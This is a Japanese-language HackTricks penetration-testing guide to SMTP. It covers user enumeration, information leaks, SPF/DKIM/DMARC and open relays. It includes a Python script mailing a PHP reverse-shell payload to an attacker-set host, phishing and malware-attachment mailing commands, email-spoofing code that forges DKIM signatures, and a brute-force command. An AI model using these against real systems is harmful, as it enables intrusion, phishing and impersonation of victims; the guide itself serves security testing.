# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**ウェブアプリ、ネットワーク、クラウドに対するハッカーの視点を得る**

**実際のビジネスに影響を与える重大で悪用可能な脆弱性を見つけて報告します。** 攻撃面をマッピングし、特権を昇格させるセキュリティ問題を見つけるために、20以上のカスタムツールを使用し、自動化されたエクスプロイトを利用して重要な証拠を収集し、あなたの努力を説得力のある報告書に変えます。

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## **基本情報**

**シンプルメール転送プロトコル (SMTP)** は、**電子メールの送受信**のためにTCP/IPスイート内で利用されるプロトコルです。受信者側でメッセージをキューイングする際の制限から、SMTPはしばしば**POP3またはIMAP**と一緒に使用されます。これらの追加プロトコルは、ユーザーがサーバーメールボックスにメッセージを保存し、定期的にダウンロードすることを可能にします。

実際には、**電子メールプログラム**が**電子メールを送信するためにSMTPを使用し、受信するためにPOP3またはIMAPを利用する**ことが一般的です。Unixベースのシステムでは、**sendmail**が電子メール目的で最も頻繁に使用されるSMTPサーバーとして際立っています。商業パッケージであるSendmailはPOP3サーバーを含んでいます。さらに、**Microsoft Exchange**はSMTPサーバーを提供し、POP3サポートを含めるオプションを提供します。

**デフォルトポート:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

もし**被害者にメールを送信させる機会がある**場合（例えば、ウェブページのコンタクトフォームを通じて）、それを行ってください。なぜなら、**メールのヘッダーを見て被害者の内部トポロジーについて学ぶことができるからです**。

また、**存在しないアドレスにメールを送信しようとすることでSMTPサーバーからメールを取得する**こともできます（サーバーは攻撃者にNDNメールを送信します）。ただし、許可されたアドレスからメールを送信し（SPFポリシーを確認）、NDNメッセージを受信できることを確認してください。

**異なる内容を送信することも試みるべきです。なぜなら、ヘッダーにより興味深い情報を見つけることができるからです**。例えば： `X-Virus-Scanned: by av.domain.com`\
EICARテストファイルを送信するべきです。\
**AV**を検出することで、**既知の脆弱性を悪用する**ことができるかもしれません。

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 組織のMXサーバーを見つける
```bash
dig +short mx google.com
```
### 列挙
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 情報漏洩

サーバーがNTLM認証（Windows）をサポートしている場合、機密情報（バージョン）を取得できます。詳細は[**こちら**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)をご覧ください。
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
または **nmap** プラグイン `smtp-ntlm-info.nse` を使用して **自動化** します。

### 内部サーバー名 - 情報漏洩

一部のSMTPサーバーは、コマンド "MAIL FROM" が完全なアドレスなしで発行されると、送信者のアドレスを自動的に補完し、内部名を開示します：
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### スニッフィング

ポート25へのパケットからパスワードをスニッフィングできるか確認してください。

### [認証ブルートフォース](../../generic-hacking/brute-force.md#smtp)

## ユーザー名ブルートフォース列挙

**認証は常に必要ではありません**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 自動ツール
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**ウェブアプリ、ネットワーク、クラウドに対するハッカーの視点を得る**

**実際のビジネスに影響を与える重要で悪用可能な脆弱性を見つけて報告します。** 攻撃面をマッピングし、特権を昇格させるセキュリティ問題を見つけるために、20以上のカスタムツールを使用し、自動化されたエクスプロイトを利用して重要な証拠を収集し、あなたの努力を説得力のある報告書に変えます。

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## DSNレポート

**配信状況通知レポート**: 組織に**無効なアドレス**に**メール**を送信すると、その組織はそのアドレスが無効であることを通知し、**あなたにメールを返送します**。返送されたメールの**ヘッダー**には、レポートとやり取りしたメールサービスの**IPアドレス**やアンチウイルスソフトウェアの情報など、可能性のある**機密情報**が**含まれます**。

## [コマンド](smtp-commands.md)

### Linuxコンソールからメールを送信する
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Pythonを使ったメールの送信

<details>

<summary>ここにPythonコード</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTPスムーギング

SMTPスムーギングの脆弱性により、すべてのSMTP保護をバイパスすることが可能でした（保護に関する詳細は次のセクションを参照してください）。SMTPスムーギングの詳細については、以下を確認してください：

{{#ref}}
smtp-smuggling.md
{{#endref}}

## メールスプーフィング対策

組織は、SMTPメッセージのスプーフィングの容易さから、**SPF**、**DKIM**、および**DMARC**を採用することにより、無許可のメールが自分たちの名義で送信されるのを防ぎます。

**これらの対策に関する完全ガイド**は[https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)で入手可能です。

### SPF

> [!CAUTION]
> SPF [は2014年に「非推奨」とされました](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。これは、`_spf.domain.com`に**TXTレコード**を作成する代わりに、**同じ構文**を使用して`domain.com`に作成することを意味します。\
> さらに、以前のspfレコードを再利用するために、`"v=spf1 include:_spf.google.com ~all"`のようなものを見つけることは非常に一般的です。

**送信者ポリシーフレームワーク**（SPF）は、メール転送エージェント（MTA）が、メールを送信しているホストが組織によって定義された承認されたメールサーバーのリストを照会することによって、そのホストがメールを送信することを許可されているかどうかを確認するためのメカニズムです。このリストには、**ドメイン名を代表してメールを送信することを許可された**さまざまな「**メカニズム**」が含まれています。

#### メカニズム

[Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)から：

| メカニズム | 説明                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 常に一致します。以前のメカニズムで一致しなかったすべてのIPに対して、`-all`のようなデフォルトの結果に使用されます。                                                                                                                                                                                                                                  |
| A         | ドメイン名に送信者のアドレスに解決できるアドレスレコード（AまたはAAAA）がある場合、一致します。                                                                                                                                                                                                                   |
| IP4       | 送信者が指定されたIPv4アドレス範囲にある場合、一致します。                                                                                                                                                                                                                                                                              |
| IP6       | 送信者が指定されたIPv6アドレス範囲にある場合、一致します。                                                                                                                                                                                                                                                                              |
| MX        | ドメイン名に送信者のアドレスに解決するMXレコードがある場合、一致します（つまり、メールはドメインの受信メールサーバーの1つから来ます）。                                                                                                                                                                          |
| PTR       | クライアントのアドレスのドメイン名（PTRレコード）が指定されたドメインにあり、そのドメイン名がクライアントのアドレスに解決する場合（前方確認された逆DNS）、一致します。このメカニズムは推奨されず、可能な限り避けるべきです。                                                                                     |
| EXISTS    | 指定されたドメイン名が任意のアドレスに解決する場合、一致します（解決されるアドレスに関係なく）。これはほとんど使用されません。SPFマクロ言語と組み合わせることで、DNSBLクエリのようなより複雑な一致を提供します。                                                                                                                           |
| INCLUDE   | 他のドメインのポリシーを参照します。そのドメインのポリシーが合格すれば、このメカニズムも合格します。ただし、含まれたポリシーが失敗した場合、処理は続行されます。他のドメインのポリシーに完全に委任するには、リダイレクト拡張を使用する必要があります。                                                                                     |
| REDIRECT  | <p>リダイレクトは、SPFポリシーをホストする別のドメイン名へのポインタであり、複数のドメインが同じSPFポリシーを共有できるようにします。これは、同じメールインフラストラクチャを共有する多数のドメインで作業する際に便利です。</p><p>リダイレクトメカニズムで示されたドメインのSPFポリシーが使用されます。</p> |

**クオリファイア**を特定することも可能で、**メカニズムが一致した場合に何をすべきかを示します**。デフォルトでは、**クオリファイア「+」**が使用されます（したがって、いずれかのメカニズムが一致する場合、それは許可されていることを意味します）。\
通常、各SPFポリシーの**最後に**、**\~all**または**-all**のようなものが記載されています。これは、**送信者がどのSPFポリシーにも一致しない場合、メールを信頼できない（\~）としてタグ付けするか、メールを拒否する（-）べきであることを示します。**

#### クオリファイア

ポリシー内の各メカニズムは、意図された結果を定義するために4つのクオリファイアのいずれかで接頭辞を付けることができます：

- **`+`**: PASS結果に対応します。デフォルトで、メカニズムはこのクオリファイアを仮定し、`+mx`は`mx`と同等です。
- **`?`**: NEUTRAL結果を表し、NONE（特定のポリシーなし）と同様に扱われます。
- **`~`**: SOFTFAILを示し、NEUTRALとFAILの中間の立場を取ります。この結果に該当するメールは通常受け入れられますが、適切にマークされます。
- **`-`**: FAILを示し、メールは完全に拒否されるべきであることを示唆します。

次の例では、**google.comのSPFポリシー**が示されています。最初のSPFポリシー内に異なるドメインからのSPFポリシーが含まれていることに注意してください：
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
従来、正しい/任意のSPFレコードを持たないドメイン名を偽装することが可能でした。**現在**、**メール**が**有効なSPFレコードのないドメイン**から送信される場合、**自動的に拒否される/信頼されていないとマークされる**可能性が高いです。

ドメインのSPFを確認するには、次のようなオンラインツールを使用できます: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIMは、外部のメール転送エージェント（MTA）による検証を可能にするために、送信メールに署名するために利用されます。これにより、DNSからドメインの公開鍵を取得します。この公開鍵は、ドメインのTXTレコードにあります。この鍵にアクセスするには、セレクタとドメイン名の両方を知っている必要があります。

例えば、鍵を要求するには、ドメイン名とセレクタが必要です。これらはメールヘッダーの`DKIM-Signature`に見つけることができます。例: `d=gmail.com;s=20120113`。

この情報を取得するためのコマンドは次のようになります:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARCは、SPFおよびDKIMプロトコルを基にしてメールセキュリティを強化します。特定のドメインからのメールの取り扱いに関するポリシーを定め、認証失敗への対処方法やメール処理アクションに関する報告を送信する場所を含みます。

**DMARCレコードを取得するには、サブドメイン\_dmarcをクエリする必要があります**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC タグ

| タグ名   | 目的                                         | サンプル                          |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | プロトコルバージョン                          | v=DMARC1                        |
| pct      | フィルタリングの対象となるメッセージの割合    | pct=20                          |
| ruf      | 法医学レポートの報告URI                     | ruf=mailto:authfail@example.com |
| rua      | 集約レポートの報告URI                       | rua=mailto:aggrep@example.com   |
| p        | 組織ドメインのポリシー                       | p=quarantine                    |
| sp       | ODのサブドメインのポリシー                   | sp=reject                       |
| adkim    | DKIMの整合性モード                           | adkim=s                         |
| aspf     | SPFの整合性モード                            | aspf=r                          |

### **サブドメインについては？**

**ここから** [**こちら**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**。**\
メールを送信する各サブドメインに対して、別々のSPFレコードを持つ必要があります。\
以下は、以前openspf.orgに投稿されたもので、この種の情報にとって素晴らしいリソースでした。

> デーモンの質問: サブドメインについては？
>
> pielovers.demon.co.ukからメールを受け取った場合、pieloversのSPFデータがない場合、1つ上のレベルに戻ってdemon.co.ukのSPFをテストすべきですか？ いいえ。Demonの各サブドメインは異なる顧客であり、各顧客は独自のポリシーを持っている可能性があります。Demonのポリシーがデフォルトで全顧客に適用されるのは理にかなりません。Demonがそれを望む場合、各サブドメインのためにSPFレコードを設定できます。
>
> したがって、SPF発行者へのアドバイスは次のとおりです: AまたはMXレコードを持つ各サブドメインまたはホスト名に対してSPFレコードを追加する必要があります。
>
> ワイルドカードAまたはMXレコードを持つサイトは、次の形式のワイルドカードSPFレコードも持つべきです: \* IN TXT "v=spf1 -all"

これは理にかなっています - サブドメインは異なる地理的場所にあり、非常に異なるSPF定義を持つ可能性があります。

### **オープンリレー**

メールが送信される際、スパムとしてフラグが立てられないようにすることが重要です。これは、**受信者によって信頼されるリレーサーバー**を使用することで達成されることが多いです。しかし、一般的な課題は、管理者がどの**IP範囲が許可されるべきかを完全に理解していない**ことです。この理解の欠如は、SMTPサーバーの設定ミスにつながる可能性があり、セキュリティ評価で頻繁に指摘されるリスクです。

特に潜在的または進行中のクライアントとの通信に関して、メール配信の問題を回避するために、一部の管理者が使用する回避策は、**任意のIPアドレスからの接続を許可すること**です。これは、以下に示すように、SMTPサーバーの`mynetworks`パラメータをすべてのIPアドレスを受け入れるように設定することで行われます。
```bash
mynetworks = 0.0.0.0/0
```
メールサーバーがオープンリレーであるかどうかを確認するために（これは外部ソースからのメールを転送できることを意味します）、`nmap`ツールが一般的に使用されます。これには、これをテストするために設計された特定のスクリプトが含まれています。`nmap`を使用してポート25でサーバー（例えば、IP 10.10.10.10）に対して詳細スキャンを実行するためのコマンドは次のとおりです：
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **ツール**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPFおよびDMARCの誤設定をチェック**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **SPFおよびDMARCの設定を自動的に取得**

### スプーフィングメールを送信

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**または、ツールを使用することもできます:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> **dkim python lib**を使用してキーを解析する際に**エラーが発生した場合**は、以下のものを使用してください。\
> **注意**: これは、何らかの理由でopensslプライベートキーが**dkimによって解析できない**場合に迅速なチェックを行うための簡易的な修正です。
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**または手動で行うこともできます:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># これは署名されていないメッセージを送信します
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **詳細情報**

**これらの保護に関する詳細情報は** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **で確認してください。**

### **その他のフィッシング指標**

- ドメインの年齢
- IPアドレスを指すリンク
- リンク操作技術
- 疑わしい（一般的でない）添付ファイル
- 壊れたメールコンテンツ
- メールヘッダーの値と異なる値の使用
- 有効で信頼できるSSL証明書の存在
- ウェブコンテンツフィルタリングサイトへのページの提出

## SMTPを通じた情報漏洩

**SMTPを介してデータを送信できる場合は** [**これを読んでください**](../../generic-hacking/exfiltration.md#smtp)**。**

## 設定ファイル

### Postfix

通常、インストールされている場合、`/etc/postfix/master.cf` には、例えば新しいメールがユーザーによって受信されたときに実行される**スクリプト**が含まれています。例えば、`flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` という行は、ユーザーmarkが新しいメールを受信した場合に`/etc/postfix/filtering`が実行されることを意味します。

他の設定ファイル:
```
sendmail.cf
submit.cf
```
## 参考文献

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks 自動コマンド
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**ウェブアプリ、ネットワーク、クラウドに対するハッカーの視点を得る**

**実際のビジネスに影響を与える重大で悪用可能な脆弱性を見つけて報告します。** 攻撃面をマッピングし、特権を昇格させるセキュリティ問題を見つけるために、20以上のカスタムツールを使用し、自動化されたエクスプロイトを利用して重要な証拠を収集し、あなたの努力を説得力のある報告書に変えます。

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{{#include ../../banners/hacktricks-training.md}}
